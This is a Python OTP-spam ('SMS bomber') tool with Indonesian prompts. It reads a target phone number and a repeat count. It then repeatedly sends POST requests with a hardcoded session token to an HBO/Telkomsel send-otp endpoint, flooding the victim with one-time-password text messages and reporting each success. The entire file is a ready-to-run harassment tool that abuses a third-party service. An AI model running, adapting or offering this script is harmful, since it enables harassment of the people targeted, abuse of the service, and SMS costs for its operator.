import requests,json,os
import sys,time
# warna ANSI
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
BOLD = '\033[1m'
RESET = '\033[0m'
k = 0
#mengetik otomatis
def mengetik(z):
    for e in z + "\n":
      sys.stdout.write(e)
      sys.stdout.flush()
      time.sleep(0.02)

def jalan(kata):
  for e in kata:
    sys.stdout.write(e)
    sys.stdout.flush()
    time.sleep(0.1)


os.system("clear")
print ("")
print("\033[31;1m  ╔═════════════════════════════════════════════╗")
mengetik(" \033[33;1m║  \033[36;1m [•] Authour  : Ismail Djaini               \033[33;1m ║")
mengetik("\033[33;1m║  \033[36;1m  [•] GitHub   : https:github.com/mrid0510    \033[33;1m ║")
mengetik(" \033[33;1m║  \033[36;1m [•] Youtube  : FYZ Channel                 \033[33;1m ║")
print("\033[31;1m  ╚═════════════════════════════════════════════╝")
print ("")
mengetik("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m Input  \033[1;33m• \033[0m\033[1;30m]══════════════>")
nomer = input(WHITE+BOLD+"Masukkan No Target : "+RESET)
jumlah = int(input(BOLD+"Jumlah Spam : "+RESET))
headers = {
'Host': 'hbounify-prod.evergent.com',
'content-length': '268',
'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
'accept': 'application/json, text/plain, */*',
'content-type': 'application/json;charset=UTF-8',
'dnt': '1',
'sec-ch-ua-mobile': '?1',
'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A035F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform': '"Android"',
'origin': 'https://hbounify-prod.evergent.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': 'https://hbounify-prod.evergent.com/telkomsel/login?operator=Telkomsel_HBO&channelPartnerID=HBO_D2C_ID&country=ID&deviceName=Linux+armv8l&deviceType=COMP&appType=Web&modelNo=20030107&serialNo=1553656907&sessionToken=4Kxg-HWP0-7cKG-ai1X-WfVN-yjQW-3E&territory=IDN&lang=en&returnURL=https%3A%2F%2Fwww.hbogoasia.id%2Fbilling&flow=native',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,la;q=0.6'}
data = json.dumps({
  "mobile_number": nomer,
  "sessionToken": "4Kxg-HWP0-7cKG-ai1X-WfVN-yjQW-3E",
  "channelPartnerID": "HBO_D2C_ID",
  "territory": "IDN",
  "lang": "en",
  "_token": "NDg2MjZmNzU2ZTY5NjY3OTdjMzEzNjM3MzczNDMxMzUzODMwMzE3YzQ1NzYzMzcyNDc2NTRlNzQ0MDQ4NDIzMDQwNTU2ZTY5",
})
os.system("clear")
print()

jalan(BLUE+BOLD+' MEMULAI SPAM . . .'+RESET.center(6))
time.sleep(2)
os.system("clear")
print()
for i in range(jumlah):
  k += 1
  pos = requests.post("https://hbounify-prod.evergent.com/telkomsel/send-otp",headers=headers,data=data).text
  if "1" in pos:
    print(YELLOW+BOLD+'█ SPAM BERHASIL TERKIRIM █'+WHITE,k,RESET)

  else:
    print("\033[1m\033[31mSPAM GAGAL TERKIRIM\033[0m",k)
